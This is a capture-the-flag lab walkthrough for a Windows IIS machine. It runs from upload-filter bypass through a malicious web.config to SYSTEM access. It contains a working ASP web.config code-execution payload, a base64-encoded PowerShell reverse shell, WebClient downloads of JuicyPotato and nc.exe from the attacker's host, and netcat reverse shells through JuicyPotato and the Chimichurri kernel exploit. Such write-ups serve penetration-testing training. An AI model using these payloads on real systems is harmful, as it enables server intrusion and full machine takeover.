#box #file-fuzzing #file-upload #webconfig #aspnet #potatoes #JuicyPotato #kernel-vulnerability #chimichurri 
1. The machine exposes on port 80 a IIS webserver. The first enumeration discovers us an endpoint `/uploadedfiles` suggesting there's an upload functionality somewhere
2. Fuzzing for files we discover an `.aspx` file called `Transfers.aspx`
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.14.157/FUZZ -c -i -e .aspx -v
```
![[attachments/bounty-1.png]]
3. On that endpoint we discover we can upload a file but unfortunately it seems we cannot exploit it to upload a php file anyhow, neither with a masqueraded shell within a magic byte nor with php derivated extensions. The check seems to be made solely on the file extension. After looking up we discover there's the possibility to upload a `web.config` and inject an `aspx` shell. Since the box is from 2018 we'll restrict the range of the google search on 2018 retrieving this link https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/
![[attachments/bounty-2.png]]
4. Once opened the link and tried the script inside of it, we realize we cannot manage to gain command execution straight forward. However, inside of that post we discover another URL which links to a different blog giving a couple of different options to upload a shell. The blog doesn't load because the page was old and replaced, however we can retrieve it within the wayback machine at https://web.archive.org/web/20160826040633/https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/. We copy the code and add it to a `web.config` file that we'll upload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```
Once uploaded, we shall obtain the value `3` to validate there's command execution
![[attachments/bounty-3.png]]
5. Now, to properly gain a shell, we must open a process that will execute for us a payload. To do that, we can rely on VB.NET function `CreateObject(WScript.Shell)` and pass to its `Run()` method an encoded powershell in base64
```vbnet
<%
CreateObject("WScript.Shell").Run("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADQAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA")
%>
```
6. Once done, uploading the file and recalling it from curl will give us a shell
```sh
curl http://10.129.14.196/uploadedFiles/web.config
```
![[attachments/bounty-4.png]]
7. Once on the machine, the transfer options are quite limited and the only way we discover to transfer files is through `(New-Object Net.Webclient).DownloadFile`. We discover we have `SeImpersonatePrivilege` and since the machine is an old Windows Server 2008 R2 we opt to transfer JuicyPotato on the target machine. Alongside it we also transfer `nc.exe` to use netcat to redirect the shell onto our machine
```sh
(New-Object Net.Webclient).DownloadFile('http://10.10.14.194:8002/JuicyPotato.exe', 'C:\Temp\potato.exe') 2>&1
(New-Object Net.Webclient).DownloadFile('http://10.10.14.194:8002/nc.exe', 'C:\Temp\nc.exe') 2>&1
```
8. Finally, we gain a root shell through the potato script using a CLSID for 2008 R2
```sh
./potato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.10.14.194 4444" -t
```

# Alternative root

Alternatively, we can also use a kernel vulnerability called `Chimichurri`. After downloading it on the target machine with

```sh
(New-Object Net.Webclient).DownloadFile('http://10.10.14.194:21/Chimichurri.exe', 'C:\Temp\Chimichurri.exe') 2>&1
```

We manage to get a reverse shell after some seconds on port 4444 as `SYSTEM` with

```sh
./Chimichurri.exe 10.10.14.194 4444
```

![[attachments/bounty-5.png]]

